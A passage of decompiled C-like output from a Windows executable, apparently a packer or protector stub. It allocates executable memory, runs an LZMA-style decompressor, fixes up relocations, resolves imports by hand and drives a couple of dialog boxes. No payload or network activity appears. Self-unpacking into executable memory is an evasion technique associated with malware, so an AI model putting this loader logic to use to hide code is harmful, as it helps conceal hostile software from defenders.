  pcVar10 = FUN_0048121f;
  param_2._0_1_ = (undefined)param_1;
  uVar27 = (undefined)param_2;
  param_3._0_1_ = (undefined)uVar8;
  uVar29 = (undefined)param_3;
  param_4._0_1_ = (undefined)uVar17;
  uVar23 = (undefined)param_4;
  param_5._0_1_ = SUB41(&stack0x00000028,0);
  uVar18 = param_5._0_1_;
  param_6._0_1_ = SUB41(puVar25,0);
  uVar21 = param_6._0_1_;
  param_7._0_1_ = (undefined)uVar32;
  uVar22 = (undefined)param_7;
  param_8._0_1_ = (undefined)uVar2;
  uVar26 = (undefined)param_8;
  param_2 = uVar9;
  param_3 = uVar8;
  param_4 = uVar17;
  param_5 = &stack0x00000028;
  param_6 = puVar25;
  param_7 = uVar32;
  param_8 = uVar2;
  FUN_0048117c(uVar2,uVar32,uVar27,uVar29,uVar23,uVar18,uVar21,uVar22,uVar26,uVar24,
               in_stack_0000002c);
  pvVar3 = VirtualAlloc((LPVOID)0x0,0xc2000,0x1000,0x40);
  uVar8 = extraout_ECX;
  uVar9 = extraout_EDX;
  DAT_004829c2 = pvVar3;
  for (iVar14 = 0; puVar30 = &param_2, *(int *)(iVar14 + (int)ppuVar11) != 0; iVar14 = iVar14 + 8) {
    (*pcVar10)(*(undefined4 *)(iVar14 + 4 + (int)ppuVar11),*(undefined4 *)(iVar14 + (int)ppuVar11),
               *(undefined4 *)(iVar4 + 0x1af1));
  }
  piVar12 = (int *)(iVar14 + 4 + (int)ppuVar11);
  if (*(int *)(iVar4 + 0x2362) == 1) {
    bVar1 = false;
    iVar14 = 0;
    piVar28 = piVar12;
    iVar19 = iVar4;
    while (!bVar1) {
      iVar20 = piVar12[1];
      param_1._0_1_ = SUB41(pvVar3,0);
      uVar17 = FUN_00481164((char)iVar14,(char)piVar28,(char)iVar19,(char)puVar30,(char)pcVar10,
                            (char)uVar9,(char)uVar8,(undefined)param_1,(undefined)param_2,
                            (undefined)param_3,in_stack_0000002c);
      if (extraout_EDX_00 == 0) {
        uVar32 = 0x20;
      }
      else {
        uVar32 = 0x40;
      }
      (**(code **)(iVar4 + 0xb01))(iVar20,uVar17,uVar32,iVar4 + 0x20b1);
      piVar12 = piVar12 + 3;
      if (*piVar12 == -1) {
        bVar1 = true;
      }
    }
    piVar12 = piVar12 + 1;
    iVar4 = iVar19;
  }
  else {
    piVar12 = piVar12 + 2;
  }
  *(int *)(iVar4 + 0x1b11) = *piVar12;
  FUN_00482904(uVar8,uVar9);
  uVar17 = 0x40;
  uVar8 = 0;
  uVar32 = 0xbbc;
  pcVar31 = (code *)0x0;
  uVar15 = (**(code **)(iVar4 + 0xaf9))();
  *(int *)(iVar4 + 0x2647) = (int)uVar15;
  puVar25 = &stack0xfffffff8;
  iVar19 = *(int *)(iVar4 + 0x1af1);
  uVar9 = extraout_ECX_00;
  (*pcVar31)(*(undefined4 *)(iVar4 + 0x2647),piVar12 + 2,iVar19,iVar14,piVar12 + 2,iVar4,
             &stack0xfffffff8,pcVar31);
  uVar16 = FUN_00482237(puVar25,iVar4);
  if ((*(int *)(iVar19 + 0x2162) != 0) && (*(int *)(iVar19 + 0x209d) != 0)) {
    FUN_004824f2(extraout_ECX_01,(int)((ulonglong)uVar16 >> 0x20));
    FUN_0048238f();
  }
  puVar13 = *(uint **)(iVar19 + 0x2647);
  for (puVar7 = puVar13; *(char *)puVar7 != '\x01'; puVar7 = (uint *)((int)puVar7 + 1)) {
  }
  piVar12 = *(int **)((int)puVar7 + 1);
  param_1._0_1_ = SUB41(pcVar10,0);
  iVar4 = FUN_00481148((char)((ulonglong)uVar15 >> 0x20),(char)uVar9,(char)uVar15,(char)uVar32,
                       (char)uVar8,(char)uVar17,(undefined)param_1,(undefined)param_2,
                       (undefined)param_3,param_4);
  *(int *)(iVar19 + 0x2643) = iVar4 + 4;
  while( true ) {
    uVar29 = (undefined)uVar9;
    uVar27 = (undefined)((ulonglong)uVar15 >> 0x20);
    if (*(char *)puVar13 == '\x01') {
      uVar26 = 0;
      uVar24 = 0xbc;
      uVar23 = (undefined)*(undefined4 *)(iVar19 + 0x2647);
      (**(code **)(iVar19 + 0xafd))();
      uVar22 = 0;
      uVar21 = 0;
      uVar18 = (undefined)*(undefined4 *)(iVar19 + 0x1af1);
      (**(code **)(iVar19 + 0xafd))();
      FUN_004811ab(extraout_ECX_02,extraout_EDX_01,uVar18,uVar21,uVar22,uVar23,uVar24,uVar26,uVar27,
                   uVar29,uVar32);
                    // WARNING: Bad instruction - Truncating control flow here
      halt_baddata();
    }
    FUN_00481a43();
    iVar4 = (**(code **)(iVar19 + 0xb05))(puVar13);
    if (iVar4 == 0) break;
    *(int *)(iVar19 + 0x263f) = iVar4;
    puVar7 = puVar13;
    while (*(char *)puVar7 != '\0') {
      do {
        if ((**(uint **)(iVar19 + 0x2643) & 0x80000000) == 0) {
          uVar5 = *(uint *)(iVar19 + 0x2643);
        }
        else {
          uVar5 = **(uint **)(iVar19 + 0x2643) ^ 0x80000000;
          *(uint *)(iVar19 + 0x1b09) = uVar5;
          **(undefined4 **)(iVar19 + 0x2643) = 0x202020;
        }
        iVar4 = (**(code **)(iVar19 + 0xaf5))(*(undefined4 *)(iVar19 + 0x263f),uVar5);
        if (iVar4 == 0) {
          if (*(int *)(iVar19 + 0x1b09) == 0) {
            iVar4 = 1;
          }
          else {
            iVar4 = 2;
          }
          goto LAB_00481a80;
        }
        *(undefined4 *)(iVar19 + 0x1b09) = 0;
        *piVar12 = iVar4;
        piVar12 = piVar12 + 1;
        for (pcVar6 = *(char **)(iVar19 + 0x2643); *pcVar6 != '\0'; pcVar6 = pcVar6 + 1) {
        }
        puVar7 = (uint *)(pcVar6 + 1);
        *(uint **)(iVar19 + 0x2643) = puVar7;
      } while ((*puVar7 & 0x80000000) != 0);
    }
    for (; *(char *)puVar13 != '\0'; puVar13 = (uint *)((int)puVar13 + 1)) {
    }
    puVar13 = (uint *)((int)puVar13 + 1);
    piVar12 = *(int **)((int)puVar7 + 1);
    iVar4 = FUN_00481148((char)((ulonglong)uVar15 >> 0x20),(char)uVar9,(char)uVar15,(char)uVar32,
                         (char)uVar8,(char)uVar17,(undefined)param_1,(undefined)param_2,
                         (undefined)param_3,param_4);
    *(int *)(iVar19 + 0x2643) = iVar4 + 4;
  }
  iVar4 = 0;
LAB_00481a80:
  uVar8 = (**(code **)(iVar19 + 0xaf9))(0,0x1000,0x1000,0x40);
  *(undefined4 *)(iVar19 + 0x2647) = uVar8;
  iVar14 = iVar19 + 0x1b45;
  uVar15 = (**(code **)(iVar19 + 0xaf1))();
  iVar20 = (int)uVar15;
  uVar8 = extraout_ECX_03;
  if (*(int *)(iVar19 + 0x1b35) == -0x544397f3) {
    uVar16 = FUN_00482971(extraout_ECX_03,(int)((ulonglong)uVar15 >> 0x20),iVar20,
                          *(int *)(iVar19 + 0x1b35));
    uVar15 = CONCAT44((int)((ulonglong)uVar16 >> 0x20),iVar20);
    *(int *)(iVar19 + 0x1b35) = (int)uVar16;
    uVar8 = extraout_ECX_04;
  }
  if (*(int *)(iVar19 + 0x1b41) == -0x15c50f29) {
    uVar15 = FUN_00482971(uVar8,(int)((ulonglong)uVar15 >> 0x20),(int)uVar15,
                          *(int *)(iVar19 + 0x1b41));
    *(int *)(iVar19 + 0x1b41) = (int)uVar15;
  }
  if (iVar4 == 0) {
    (**(code **)(iVar19 + 0x1b41))(*(undefined4 *)(iVar19 + 0x2647),iVar19 + 0x1b7a,puVar13);
  }
  else if (iVar4 == 1) {
    (**(code **)(iVar19 + 0x1b41))
              (*(undefined4 *)(iVar19 + 0x2647),iVar19 + 0x1ba2,*(undefined4 *)(iVar19 + 0x2643),
               puVar13);
  }
  else if (iVar4 == 2) {
    (**(code **)(iVar19 + 0x1b41))
              (*(undefined4 *)(iVar19 + 0x2647),iVar19 + 0x1bdb,*(undefined4 *)(iVar19 + 0x1b09),
               puVar13);
  }
  iVar4 = iVar19 + 0x1b50;
  (**(code **)(iVar19 + 0x1b35))(0,*(undefined4 *)(iVar19 + 0x2647),iVar4,0x30);
  (**(code **)(iVar19 + 0xafd))(*(undefined4 *)(iVar19 + 0x2647),0x1000,0x4000);
  return CONCAT44(iVar4,iVar14);
}



void FUN_0048112a(void)

{
  return;
}



undefined4
FUN_00481148(undefined param_1,undefined param_2,undefined param_3,undefined param_4,
            undefined param_5,undefined param_6,undefined param_7,undefined param_8,
            undefined param_9,undefined4 param_10)

{
  undefined4 in_EAX;
  
  return in_EAX;
}



undefined4
FUN_00481164(undefined param_1,undefined param_2,undefined param_3,undefined param_4,
            undefined param_5,undefined param_6,undefined param_7,undefined param_8,
            undefined param_9,undefined param_10,undefined4 param_11)

{
  undefined4 in_EAX;
  
  return in_EAX;
}



undefined8 __fastcall
FUN_0048117c(undefined4 param_1,undefined4 param_2,undefined param_3,undefined param_4,
            undefined param_5,undefined param_6,undefined param_7,undefined param_8,
            undefined param_9,undefined param_10,int param_11)

{
  int *piVar1;
  int iVar2;
  undefined4 in_EAX;
  int unaff_EBP;
  int unaff_ESI;
  int unaff_EDI;
  
  if (*(int *)(unaff_EBP + 0x1afd) != 0) {
    iVar2 = *(int *)(unaff_EBP + 0x1af5);
    for (; *(int *)(unaff_EDI + unaff_ESI) != 0; unaff_EDI = unaff_EDI + 8) {
      piVar1 = (int *)(unaff_EDI + 4 + unaff_ESI);
      *piVar1 = *piVar1 - iVar2;
      piVar1 = (int *)(unaff_EDI + 4 + unaff_ESI);
      *piVar1 = *piVar1 + param_11;
      *(int *)(unaff_EDI + unaff_ESI) = *(int *)(unaff_EDI + unaff_ESI) - iVar2;
      *(int *)(unaff_EDI + unaff_ESI) = *(int *)(unaff_EDI + unaff_ESI) + param_11;
    }
  }
  return CONCAT44(param_2,in_EAX);
}



undefined8 __fastcall
FUN_004811ab(undefined4 param_1,undefined4 param_2,undefined param_3,undefined param_4,
            undefined param_5,undefined param_6,undefined param_7,undefined param_8,
            undefined param_9,undefined param_10,int param_11)

{
  int iVar1;
  int iVar2;
  undefined4 in_EAX;
  int *piVar3;
  uint uVar4;
  int unaff_EBP;
  int *piVar5;
  
  if (*(int *)(unaff_EBP + 0x1afd) != 0) {
    iVar1 = *(int *)(unaff_EBP + 0x1af5);
    *(int *)(unaff_EBP + 0x1af9) = param_11;
    if (param_11 != iVar1) {
      piVar5 = (int *)(*(int *)(unaff_EBP + 0x1afd) + param_11);
      while (*piVar5 != 0) {
        iVar2 = *piVar5;
        *(int *)(unaff_EBP + 0x1b01) = piVar5[1];
        *(int *)(unaff_EBP + 0x1b01) = *(int *)(unaff_EBP + 0x1b01) + (int)piVar5;
        for (piVar5 = piVar5 + 2; piVar5 < *(int **)(unaff_EBP + 0x1b01);
            piVar5 = (int *)((int)piVar5 + 2)) {
          uVar4 = (uint)(*(ushort *)piVar5 >> 0xc);
          piVar3 = (int *)((uint)*(ushort *)piVar5 + uVar4 * -0x1000 + iVar2 +
                          *(int *)(unaff_EBP + 0x1af9));
          if (uVar4 == 3) {
            *piVar3 = *piVar3 - iVar1;
            *piVar3 = *piVar3 + *(int *)(unaff_EBP + 0x1af9);
          }
        }
      }
    }
  }
  return CONCAT44(param_2,in_EAX);
}



uint FUN_0048121f(int param_1,byte *param_2,undefined4 *param_3)

{
  byte *pbVar1;
  byte *pbVar2;
  uint uVar3;
  int iVar4;
  uint *puVar5;
  int iVar6;
  int iVar7;
  undefined4 *puVar8;
  uint uVar9;
  uint uVar10;
  int local_30;
  int local_2c;
  uint local_28;
  int local_24;
  int local_20;
  int local_1c;
  int local_18;
  uint local_14;
  int local_10;
  byte *local_c;
  byte local_5;
  
  local_18 = 1;
  local_20 = 1;
  local_1c = 1;
  local_2c = 1;
  puVar8 = param_3;
  for (iVar4 = 0x30736; iVar4 != 0; iVar4 = iVar4 + -1) {
    *puVar8 = 0x400;
    puVar8 = puVar8 + 1;
  }
  local_c = param_2;
  local_14 = 0;
  local_5 = 0;
  local_10 = 0;
  param_2 = (byte *)0x0;
  pbVar1 = (byte *)0xffffffff;
  iVar4 = 5;
  do {
    param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
    local_c = local_c + 1;
    iVar4 = iVar4 + -1;
  } while (iVar4 != 0);
LAB_00481274:
  iVar4 = local_2c;
  uVar9 = local_14 & 3;
  puVar5 = param_3 + local_10 * 0x10 + uVar9;
  pbVar2 = pbVar1;
  if (pbVar1 < (byte *)0x1000000) {
    param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
    pbVar2 = (byte *)((int)pbVar1 << 8);
    local_c = local_c + 1;
  }
  uVar10 = *puVar5;
  pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar10);
  if (param_2 < pbVar1) {
    *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
    iVar4 = 1;
    pbVar2 = pbVar1;
    if (local_10 < 7) goto LAB_0048138c;
    local_28 = (uint)*(byte *)(param_1 + (local_14 - local_18));
    do {
      local_28 = local_28 << 1;
      uVar9 = local_28 & 0x100;
      puVar5 = param_3 + (uint)local_5 * 0x300 + iVar4 + uVar9 + 0x836;
      pbVar2 = pbVar1;
      if (pbVar1 < (byte *)0x1000000) {
        param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
        pbVar2 = (byte *)((int)pbVar1 << 8);
        local_c = local_c + 1;
      }
      uVar10 = *puVar5;
      pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar10);
      if (param_2 < pbVar1) {
        iVar4 = iVar4 * 2;
        *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
        if (uVar9 != 0) goto LAB_004813e5;
      }
      else {
        param_2 = param_2 + -(int)pbVar1;
        pbVar1 = pbVar2 + -(int)pbVar1;
        *puVar5 = uVar10 - (uVar10 >> 5);
        iVar4 = iVar4 * 2 + 1;
        if (uVar9 == 0) goto LAB_004813e5;
      }
    } while (iVar4 < 0x100);
    goto LAB_004813ed;
  }
  param_2 = param_2 + -(int)pbVar1;
  uVar3 = (int)pbVar2 - (int)pbVar1;
  *puVar5 = uVar10 - (uVar10 >> 5);
  puVar5 = param_3 + local_10 + 0xc0;
  if (uVar3 < 0x1000000) {
    param_2 = (byte *)((int)param_2 * 0x100 | (uint)*local_c);
    uVar3 = uVar3 * 0x100;
    local_c = local_c + 1;
  }
  uVar10 = *puVar5;
  pbVar2 = (byte *)((uVar3 >> 0xb) * uVar10);
  if (param_2 < pbVar2) {
    local_2c = local_1c;
    local_1c = local_20;
    *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
    local_20 = local_18;
    if (local_10 < 7) {
      local_10 = 0;
    }
    else {
      local_10 = 3;
    }
    puVar5 = param_3 + 0x332;
  }
  else {
    param_2 = param_2 + -(int)pbVar2;
    uVar3 = uVar3 - (int)pbVar2;
    *puVar5 = uVar10 - (uVar10 >> 5);
    puVar5 = param_3 + local_10 + 0xcc;
    if (uVar3 < 0x1000000) {
      param_2 = (byte *)((int)param_2 * 0x100 | (uint)*local_c);
      uVar3 = uVar3 * 0x100;
      local_c = local_c + 1;
    }
    uVar10 = *puVar5;
    pbVar2 = (byte *)((uVar3 >> 0xb) * uVar10);
    if (param_2 < pbVar2) {
      *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
      puVar5 = param_3 + (local_10 + 0xf) * 0x10 + uVar9;
      if (pbVar2 < (byte *)0x1000000) {
        pbVar2 = (byte *)((int)pbVar2 * 0x100);
        param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
        local_c = local_c + 1;
      }
      uVar10 = *puVar5;
      pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar10);
      if (param_2 < pbVar1) {
        *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
        local_10 = (uint)(6 < local_10) * 2 + 9;
        local_5 = *(byte *)(param_1 + (local_14 - local_18));
        *(byte *)(param_1 + local_14) = local_5;
        local_14 = local_14 + 1;
        goto LAB_00481274;
      }
      param_2 = param_2 + -(int)pbVar1;
      pbVar2 = pbVar2 + -(int)pbVar1;
      *puVar5 = uVar10 - (uVar10 >> 5);
    }
    else {
      param_2 = param_2 + -(int)pbVar2;
      uVar3 = uVar3 - (int)pbVar2;
      *puVar5 = uVar10 - (uVar10 >> 5);
      puVar5 = param_3 + local_10 + 0xd8;
      if (uVar3 < 0x1000000) {
        param_2 = (byte *)((int)param_2 * 0x100 | (uint)*local_c);
        uVar3 = uVar3 * 0x100;
        local_c = local_c + 1;
      }
      uVar10 = *puVar5;
      pbVar2 = (byte *)((uVar3 >> 0xb) * uVar10);
      if (param_2 < pbVar2) {
        *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
        iVar4 = local_20;
      }
      else {
        param_2 = param_2 + -(int)pbVar2;
        uVar3 = uVar3 - (int)pbVar2;
        *puVar5 = uVar10 - (uVar10 >> 5);
        puVar5 = param_3 + local_10 + 0xe4;
        if (uVar3 < 0x1000000) {
          param_2 = (byte *)((int)param_2 * 0x100 | (uint)*local_c);
          uVar3 = uVar3 * 0x100;
          local_c = local_c + 1;
        }
        uVar10 = *puVar5;
        pbVar2 = (byte *)((uVar3 >> 0xb) * uVar10);
        if (param_2 < pbVar2) {
          *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
          iVar4 = local_1c;
        }
        else {
          param_2 = param_2 + -(int)pbVar2;
          pbVar2 = (byte *)(uVar3 - (int)pbVar2);
          *puVar5 = uVar10 - (uVar10 >> 5);
          local_2c = local_1c;
        }
        local_1c = local_20;
      }
      local_20 = local_18;
      local_18 = iVar4;
    }
    local_10 = ((6 < local_10) - 1 & 0xfffffffd) + 0xb;
    puVar5 = param_3 + 0x534;
  }
  if (pbVar2 < (byte *)0x1000000) {
    param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
    pbVar2 = (byte *)((int)pbVar2 << 8);
    local_c = local_c + 1;
  }
  uVar10 = *puVar5;
  pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar10);
  if (param_2 < pbVar1) {
    local_28 = 0;
    *puVar5 = (0x800 - uVar10 >> 5) + uVar10;
    iVar4 = uVar9 * 8 + 2;
LAB_0048173f:
    puVar5 = puVar5 + iVar4;
    local_24 = 3;
  }
  else {
    param_2 = param_2 + -(int)pbVar1;
    uVar3 = (int)pbVar2 - (int)pbVar1;
    *puVar5 = uVar10 - (uVar10 >> 5);
    if (uVar3 < 0x1000000) {
      param_2 = (byte *)((int)param_2 * 0x100 | (uint)*local_c);
      uVar3 = uVar3 * 0x100;
      local_c = local_c + 1;
    }
    uVar10 = puVar5[1];
    pbVar1 = (byte *)((uVar3 >> 0xb) * uVar10);
    if (param_2 < pbVar1) {
      puVar5[1] = (0x800 - uVar10 >> 5) + uVar10;
      iVar4 = uVar9 * 8 + 0x82;
      local_28 = 8;
      goto LAB_0048173f;
    }
    param_2 = param_2 + -(int)pbVar1;
    pbVar1 = (byte *)(uVar3 - (int)pbVar1);
    puVar5[1] = uVar10 - (uVar10 >> 5);
    puVar5 = puVar5 + 0x102;
    local_28 = 0x10;
    local_24 = 8;
  }
  local_30 = local_24;
  iVar4 = 1;
  do {
    pbVar2 = pbVar1;
    if (pbVar1 < (byte *)0x1000000) {
      param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
      pbVar2 = (byte *)((int)pbVar1 << 8);
      local_c = local_c + 1;
    }
    uVar9 = puVar5[iVar4];
    pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar9);
    if (param_2 < pbVar1) {
      puVar5[iVar4] = (0x800 - uVar9 >> 5) + uVar9;
      iVar4 = iVar4 * 2;
    }
    else {
      param_2 = param_2 + -(int)pbVar1;
      pbVar1 = pbVar2 + -(int)pbVar1;
      puVar5[iVar4] = uVar9 - (uVar9 >> 5);
      iVar4 = iVar4 * 2 + 1;
    }
    local_30 = local_30 + -1;
  } while (local_30 != 0);
  iVar7 = 1;
  iVar4 = iVar4 + (local_28 - (1 << (sbyte)local_24));
  if (local_10 < 4) {
    local_10 = local_10 + 7;
    iVar6 = iVar4;
    if (3 < iVar4) {
      iVar6 = 3;
    }
    local_30 = 6;
    do {
      pbVar2 = pbVar1;
      if (pbVar1 < (byte *)0x1000000) {
        param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
        pbVar2 = (byte *)((int)pbVar1 << 8);
        local_c = local_c + 1;
      }
      uVar9 = param_3[iVar6 * 0x40 + iVar7 + 0x1b0];
      pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar9);
      if (param_2 < pbVar1) {
        param_3[iVar6 * 0x40 + iVar7 + 0x1b0] = (0x800 - uVar9 >> 5) + uVar9;
        iVar7 = iVar7 * 2;
      }
      else {
        param_2 = param_2 + -(int)pbVar1;
        pbVar1 = pbVar2 + -(int)pbVar1;
        param_3[iVar6 * 0x40 + iVar7 + 0x1b0] = uVar9 - (uVar9 >> 5);
        iVar7 = iVar7 * 2 + 1;
      }
      local_30 = local_30 + -1;
    } while (local_30 != 0);
    uVar9 = iVar7 - 0x40;
    if (3 < (int)uVar9) {
      local_18 = ((int)uVar9 >> 1) + -1;
      uVar10 = uVar9 & 1 | 2;
      if ((int)uVar9 < 0xe) {
        uVar10 = uVar10 << ((byte)local_18 & 0x1f);
        puVar8 = param_3 + (uVar10 - uVar9) + 0x2af;
      }
      else {
        iVar7 = ((int)uVar9 >> 1) + -5;
        do {
          if (pbVar1 < (byte *)0x1000000) {
            param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
            pbVar1 = (byte *)((int)pbVar1 << 8);
            local_c = local_c + 1;
          }
          pbVar1 = (byte *)((uint)pbVar1 >> 1);
          uVar10 = uVar10 * 2;
          if (pbVar1 <= param_2) {
            param_2 = param_2 + -(int)pbVar1;
            uVar10 = uVar10 | 1;
          }
          iVar7 = iVar7 + -1;
        } while (iVar7 != 0);
        puVar8 = param_3 + 0x322;
        uVar10 = uVar10 << 4;
        local_18 = 4;
      }
      iVar7 = 1;
      local_28 = 1;
      uVar9 = uVar10;
      do {
        pbVar2 = pbVar1;
        if (pbVar1 < (byte *)0x1000000) {
          param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
          pbVar2 = (byte *)((int)pbVar1 << 8);
          local_c = local_c + 1;
        }
        uVar10 = puVar8[iVar7];
        pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar10);
        if (param_2 < pbVar1) {
          puVar8[iVar7] = (0x800 - uVar10 >> 5) + uVar10;
          iVar7 = iVar7 * 2;
        }
        else {
          param_2 = param_2 + -(int)pbVar1;
          pbVar1 = pbVar2 + -(int)pbVar1;
          uVar9 = uVar9 | local_28;
          puVar8[iVar7] = uVar10 - (uVar10 >> 5);
          iVar7 = iVar7 * 2 + 1;
        }
        local_28 = local_28 << 1;
        local_18 = local_18 + -1;
      } while (local_18 != 0);
    }
    local_18 = uVar9 + 1;
    if (local_18 == 0) {
      return local_14;
    }
  }
  iVar4 = iVar4 + 2;
  pbVar2 = (byte *)((local_14 - local_18) + param_1);
  do {
    local_5 = *pbVar2;
    iVar4 = iVar4 + -1;
    uVar9 = local_14 + 1;
    pbVar2 = pbVar2 + 1;
    *(byte *)(param_1 + local_14) = local_5;
    local_14 = uVar9;
  } while (iVar4 != 0);
  goto LAB_00481274;
LAB_004813e5:
  while (pbVar2 = pbVar1, iVar4 < 0x100) {
LAB_0048138c:
    puVar5 = param_3 + (uint)local_5 * 0x300 + iVar4 + 0x736;
    if (pbVar2 < (byte *)0x1000000) {
      param_2 = (byte *)((int)param_2 << 8 | (uint)*local_c);
      pbVar2 = (byte *)((int)pbVar2 << 8);
      local_c = local_c + 1;
    }
    uVar9 = *puVar5;
    pbVar1 = (byte *)(((uint)pbVar2 >> 0xb) * uVar9);
    if (param_2 < pbVar1) {
      *puVar5 = (0x800 - uVar9 >> 5) + uVar9;
      iVar4 = iVar4 * 2;
    }
    else {
      param_2 = param_2 + -(int)pbVar1;
      pbVar1 = pbVar2 + -(int)pbVar1;
      *puVar5 = uVar9 - (uVar9 >> 5);
      iVar4 = iVar4 * 2 + 1;
    }
  }
LAB_004813ed:
  uVar9 = local_14 + 1;
  local_5 = (byte)iVar4;
  *(byte *)(param_1 + local_14) = local_5;
  local_14 = uVar9;
  if (local_10 < 4) {
    local_10 = 0;
  }
  else if (local_10 < 10) {
    local_10 = local_10 + -3;
  }
  else {
    local_10 = local_10 + -6;
  }
  goto LAB_00481274;
}



void FUN_00481a43(void)

{
  char *unaff_ESI;
  char *pcVar1;
  
  for (pcVar1 = unaff_ESI; *pcVar1 != '\0'; pcVar1 = pcVar1 + 1) {
  }
  for (; (*pcVar1 != '\\' && (pcVar1 != unaff_ESI)); pcVar1 = pcVar1 + -1) {
  }
  return;
}



undefined4 FUN_00481bec(undefined param_1,undefined param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 *extraout_ECX;
  undefined4 *extraout_ECX_00;
  undefined4 *extraout_ECX_01;
  
  iVar1 = FUN_0048112a();
  *(undefined4 *)(iVar1 + 0xb8) = *extraout_ECX;
  iVar1 = FUN_0048112a();
  *(undefined4 *)(iVar1 + 0xc4) = *extraout_ECX_00;
  iVar1 = FUN_0048112a();
  *(undefined4 *)(iVar1 + 0xb4) = *extraout_ECX_01;
  return 0;
}



// WARNING: Restarted to delay deadcode elimination for space: stack

undefined8 __fastcall
FUN_00481e4f(undefined4 param_1,undefined4 param_2,undefined4 param_3,int param_4,int param_5)

{
  undefined4 extraout_ECX;
  undefined4 uVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined8 uVar4;
  undefined4 local_8;
  
  local_8 = 0;
  DAT_0040308d = param_3;
  if (param_4 == 0x110) {
    local_8 = 1;
    puVar2 = &DAT_00403366;
    uVar1 = param_2;
    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {
      uVar4 = (*DAT_0040306d)(param_3,*puVar2);
      uVar1 = (undefined4)((ulonglong)uVar4 >> 0x20);
      *puVar2 = (int)uVar4;
      puVar2 = puVar2 + 1;
      param_1 = extraout_ECX;
    }
    FUN_00481fae(param_1,uVar1);
  }
  else if ((param_4 == 0x10) || (DAT_00403091 == 1)) {
    (*DAT_00403069)(param_3,0);
  }
  else if ((param_4 == 0x111) && (param_5 == 7)) {
    iVar3 = (*DAT_00402b35)(0,&DAT_00402c75,&DAT_00402c3e,0x34);
    if (iVar3 == 6) {
      (*DAT_00403069)(param_3,0);
      (*DAT_00403089)(0);
    }
  }
  return CONCAT44(param_2,local_8);
}



// WARNING: Restarted to delay deadcode elimination for space: stack

undefined8 __fastcall
FUN_00481f08(undefined4 param_1,undefined4 param_2,undefined4 param_3,int param_4,int param_5)

{
  undefined4 uVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 local_8;
  
  local_8 = 0;
  DAT_0040308d = param_3;
  if (param_4 == 0x110) {
    local_8 = 1;
    puVar2 = &DAT_00403382;
    for (iVar3 = 3; iVar3 != 0; iVar3 = iVar3 + -1) {
      uVar1 = (*DAT_0040306d)(param_3,*puVar2);
      *puVar2 = uVar1;
      puVar2 = puVar2 + 1;
    }
  }
  else if ((param_4 == 0x10) || (DAT_00403091 == 1)) {
    (*DAT_00403069)(param_3,0);
  }
  else if ((param_4 == 0x111) && (param_5 == 3)) {
    (*DAT_00403075)(DAT_00403386,DAT_004030a5,0x100);
    (*DAT_00403069)(param_3,0);
  }
  return CONCAT44(param_2,local_8);
}



undefined8 __fastcall FUN_00481fae(undefined4 param_1,undefined4 param_2)

{
  undefined4 extraout_ECX;
  int unaff_ESI;
  undefined8 uVar1;
  int iVar2;
  
  uVar1 = FUN_00482935(param_1,param_2);
  *(int *)(unaff_ESI + 0x1b15) = (int)uVar1;
  uVar1 = FUN_00482971(extraout_ECX,(int)((ulonglong)uVar1 >> 0x20),*(int *)(unaff_ESI + 0x1b15),
                       *(int *)(unaff_ESI + 0x2085));
  *(int *)(unaff_ESI + 0x2085) = (int)uVar1;
  iVar2 = unaff_ESI + 0x20ad;
  (**(code **)(unaff_ESI + 0x2085))(0,0,unaff_ESI + 0x111d);
  return CONCAT44(iVar2,unaff_ESI);
}



undefined8 __fastcall FUN_00482237(undefined4 param_1,undefined4 param_2)

{
  undefined4 in_EAX;
  int iVar1;
  undefined4 extraout_ECX;
  int unaff_EBP;
  char *pcVar2;
  undefined8 uVar3;
  
  for (pcVar2 = *(char **)(unaff_EBP + 0x2647); *pcVar2 != '\x01'; pcVar2 = pcVar2 + 1) {
    iVar1 = (**(code **)(unaff_EBP + 0xb05))(pcVar2);
    if (iVar1 == 0) {
      uVar3 = (**(code **)(unaff_EBP + 0xaf1))(pcVar2);
      if ((int)uVar3 == 0) {
        FUN_0048226b(extraout_ECX,(int)((ulonglong)uVar3 >> 0x20));
      }
    }
    for (; *pcVar2 != '\0'; pcVar2 = pcVar2 + 1) {
    }
  }
  return CONCAT44(param_2,in_EAX);
}



undefined8 __fastcall FUN_0048226b(undefined4 param_1,undefined4 param_2)

{
  undefined4 in_EAX;
  undefined4 uVar1;
  char *pcVar2;
  char *pcVar3;
  int iVar4;
  int unaff_EBP;
  char *unaff_ESI;
  char *pcVar5;
  char *pcVar6;
  bool bVar7;
  
  if (*(int *)(unaff_EBP + 0x2162) != 0) {
    if (*(int *)(unaff_EBP + 0x209d) == 0) {
      uVar1 = (**(code **)(unaff_EBP + 0xaf9))(0,0x1000,0x1000,0x40);
      *(undefined4 *)(unaff_EBP + 0x20a9) = uVar1;
      uVar1 = (**(code **)(unaff_EBP + 0xaf9))(0,0x1000,0x1000,0x40);
      *(undefined4 *)(unaff_EBP + 0x20a5) = uVar1;
      uVar1 = (**(code **)(unaff_EBP + 0xaf9))(0,0x1000,0x1000,0x40);
      *(undefined4 *)(unaff_EBP + 0x209d) = uVar1;
    }
    *(undefined4 *)(unaff_EBP + 0x2095) = 0;
